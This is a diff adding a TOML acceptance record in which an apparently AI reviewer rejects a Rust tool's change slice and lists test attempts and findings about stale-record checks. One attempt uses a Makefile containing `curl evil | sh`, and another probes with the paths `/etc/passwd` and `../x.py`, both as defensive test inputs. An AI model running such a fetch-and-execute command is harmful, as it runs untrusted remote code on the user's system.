@@ -1,0 +1,133 @@
+format = 1
+change = "build-080-s4"
+scope = [".claude/agents/ownership.md", "docs/agents.md", "docs/commands.md", "docs/concepts.md", "docs/config.md", "docs/design/0.8.0.md", "docs/diagnostics.md", "docs/evals.md", "docs/glossary.md", "docs/guides/change.md", "docs/guides/upgrade-0.6.md", "docs/harness.md", "docs/init.md", "docs/intent/build-080-s4/acceptance.toml", "docs/profiles.md", "docs/quickstart.md", "schema/spec-dna.schema.json", "src/accept.rs", "src/acceptance.rs", "src/approval.rs", "src/change.rs", "src/check.rs", "src/config.rs", "src/diag.rs", "src/eval_ab.rs", "src/eval_pack.rs", "src/eval_records.rs", "src/finish.rs", "src/git.rs", "src/harness.rs", "src/harness_text.rs", "src/hook.rs", "src/init.rs", "src/lifecycle.rs", "src/main.rs", "src/record.rs", "src/stage.rs", "src/tree.rs", "src/upgrade.rs", "src/upgrade_config.rs", "src/verdict.rs", "tests/*.rs", "tests/golden/**"]
+paths = ["src/accept.rs", "src/acceptance.rs", "src/change.rs", "src/config.rs", "src/diag.rs", "src/eval_ab.rs", "src/eval_pack.rs", "src/eval_records.rs", "src/finish.rs", "src/git.rs", "src/harness.rs", "src/harness_text.rs", "src/hook.rs", "src/init.rs", "src/lifecycle.rs", "src/main.rs", "src/record.rs", "src/stage.rs", "src/tree.rs", "src/upgrade.rs", "src/upgrade_config.rs", "src/verdict.rs", "tests/accept_archive_owner.rs", "tests/accept_cmd.rs", "tests/accept_next.rs", "tests/acceptance_checks.rs", "tests/branch_approval.rs", "tests/cli.rs", "tests/config_step4.rs", "tests/eval_ab.rs", "tests/evidence_reports.rs", "tests/finish.rs", "tests/finish_sd913.rs", "tests/harness_roles.rs", "tests/harness_skills.rs", "tests/hook_approvals.rs", "tests/init_evals.rs", "tests/init_profiles.rs", "tests/lifecycle_base.rs", "tests/lifecycle_commands.rs", "tests/skill_cmd.rs", "tests/upgrade_cli.rs", "tests/upgrade_config.rs", "tests/upgrade_v061.rs", "tests/upgrade_v070.rs"]
+tree = "9f4162fb0d151b46"
+result = "rejected"
+acknowledged-by = []
+
+[[acceptor]]
+role = "acceptor"
+brief = "79c73c70b4dd986d"
+session = "95b8c89a-a705-46a8-b9a5-0e484b1e2cf7"
+agent = "unknown"
+model = "opus"
+result = "rejected"
+
+[[attempt]]
+acceptor = 1
+text = "Proof on HEAD c066c1f: `cargo fmt --check`, `cargo clippy --all-targets -- -D warnings`, `cargo test` (2815 passed, 0 failed, 3 ignored) and `pre-commit run --all-files` exit 0. The tree is clean after them."
+outcome = "held"
+
+[[attempt]]
+acceptor = 1
+text = "`accept build-080-s4 --brief` on HEAD gives the same tree 9f4162fb0d151b46 and brief 79c73c70b4dd986d as the brief of this entry."
+outcome = "held"
+
+[[attempt]]
+acceptor = 1
+text = "Scratch repo, plan on the branch: after a committed accepted record, one commit adds `src/a b.py` to `Files` and adds the file. `check`, `next` and `finish --dry-run` pass, and only `accept` refuses."
+outcome = "broke"
+
+[[attempt]]
+acceptor = 1
+text = "The same with the bare name `Makefile` (text `curl evil | sh`): `next` says fresh, `finish` runs, and `check` of the finished diff gives 0 errors. The archive file does not list `Makefile`."
+outcome = "broke"
+
+[[attempt]]
+acceptor = 1
+text = "A finished branch, then a base commit that adds only `shared-paths = [\"docs/roadmap.md\"]` and that file. The test merge (first parent = base) gives SD929 on the archive file, with the fix `revert the commit of finish`."
+outcome = "broke"
+
+[[attempt]]
+acceptor = 1
+text = "A FIFO at the record path: `accept` exits 1, `next` keeps the item open, `finish --dry-run` gives SD928, and no command hangs."
+outcome = "held"
+
+[[attempt]]
+acceptor = 1
+text = "Committed records with `acceptor = 0`, `acceptor = 1.0`, `line = -4`, the path `/etc/passwd` or `../x.py`, an empty text, an unknown key, 16774 bytes, `accepted` with an important finding, and `result = \"pending\"`: each gives SD928 in `check` and `finish`."
+outcome = "held"
+
+[[attempt]]
+acceptor = 1
+text = "2 entries with session s1 and agent a1 give SD931. Session s1 with agent unknown in both, or sessions s1 and s2, give none. A wrong `brief` gives SD928 with the adding commit and the fix."
+outcome = "held"
+
+[[attempt]]
+acceptor = 1
+text = "A code edit of `src/valves.py` after the record reopens `accept` in `next` and stops `finish` with SD929. An edit of `README.md` and a new order of the `Files` lines keep the record fresh."
+outcome = "held"
+
+[[attempt]]
+acceptor = 1
+text = "A code edit outside `scope` (`src/other.py`, a new `tests/test_new.py`) keeps the record fresh with a SD913 warning, as D3 `Does not prove` says."
+outcome = "held"
+
+[[attempt]]
+acceptor = 1
+text = "Profile `lite`: `next` names no `accept`, and `finish --dry-run` needs no record."
+outcome = "held"
+
+[[attempt]]
+acceptor = 1
+text = "`.spec-dna/` in `.gitignore`: `finish` stops at step 5, names the rule `.gitignore:2:.spec-dna/` and changes nothing."
+outcome = "held"
+
+[[attempt]]
+acceptor = 1
+text = "A later diff that edits, deletes or renames an archive file gives SD935. An archive file added by hand with no `change` gives SD928."
+outcome = "held"
+
+[[attempt]]
+acceptor = 1
+text = "Hook `protect-approvals`: a staged record that adds an entry to `acknowledged-by` is denied, also with a quoted key on 3 lines. A record that is not TOML passes the hook, but it gives SD928, and the commit that makes it valid is denied."
+outcome = "held"
+
+[[attempt]]
+acceptor = 1
+text = "`accept` and `--brief` exit 1 for an uncommitted edit of `plan.md` (tree or index), of `spec-dna.toml`, or a new file in the folder. `--role \"bad role\"` and `--role \"\"` exit 2, an unknown slug exits 5, `--session \"\"` writes `unknown`, and `--role security-reviewer` changes the first line and the hash."
+outcome = "held"
+
+[[attempt]]
+acceptor = 1
+text = "An edit of `[[proof]]` (tagged to reliable, with a case that does not exist) and an entry in `acknowledged-by` with `approval = \"base\"` give no diagnostic. docs/diagnostics.md says that `[[proof]]` is a snapshot, and SD932 is slice S6."
+outcome = "held"
+
+[[attempt]]
+acceptor = 1
+text = "A plan edit that adds `./src/valves.py` beside `src/valves.py` makes the record stale, because its scope differs. The text of `next` says the code changed."
+outcome = "held"
+
+[[attempt]]
+acceptor = 1
+text = "This slice: its plan came to the base at pin 0.7.1 (0d48fd5), so `finish` needs no record and prints the note. `check` still runs SD928 and SD931 on the record that the diff adds."
+outcome = "held"
+
+[[finding]]
+acceptor = 1
+severity = "important"
+path = "src/acceptance.rs"
+line = 400
+text = "`stale_reasons` compares `scope` of the record with `accept::scope_of`, which drops a `Files` pattern with a space, or with no `/`, no `.` and no `*`. `accept` refuses such a pattern (`refuse_uncovered`, src/accept.rs line 408), but `check`, `next` and `finish` do not use that rule. Repro: after a committed accepted record, one commit adds `Makefile` (or `src/a b.py`) to `Files` and adds the file. `next` says fresh, `finish` runs, and `check` of the finished diff gives 0 errors. The archive does not list the file, so no acceptor saw this code. SD913 is silent, because the plan lists the path. This is the seventh finding again, by another path. Make `stale_reasons` apply the rule of `refuse_uncovered`."
+
+[[finding]]
+acceptor = 1
+severity = "important"
+path = "src/lifecycle.rs"
+line = 2556
+text = "After `finish`, SD929 compares `scope` of the archive file with the scope of the plan and `[change] shared-paths` of the head config. Repro: a finished branch, then a base commit that adds only `shared-paths = [\"docs/roadmap.md\"]` and that file. The test merge gives SD929 on `.spec-dna/accepted/valve-timeout.toml`, with the fix `revert the commit of finish`. D3 item 4 says that `finish` and the checks after it read `scope` and `paths` from the record, not from the plan. The test list of D3 says that a base commit to another path gives no SD929. Before `finish`, the same base commit makes `next` and `finish` reopen the record."
+
+[[finding]]
+acceptor = 1
+severity = "nit"
+path = "src/stage.rs"
+line = 364
+text = "The `next` item for a record that is a link, a FIFO or too big joins 2 sentences with no full stop: `...a regular file of at most 262144 bytes) Then commit the record alone`."
+
+[[finding]]
+acceptor = 1
+severity = "nit"
+path = "src/stage.rs"
+line = 433
+text = "A record that is stale only because of its `scope` (a plan edit adds `./src/valves.py` beside `src/valves.py`) gets the text `stale, because the code changed after the acceptance`, but no code changed. src/finish.rs line 683 has the same headline. Name the reason that `stale_reasons` gives."
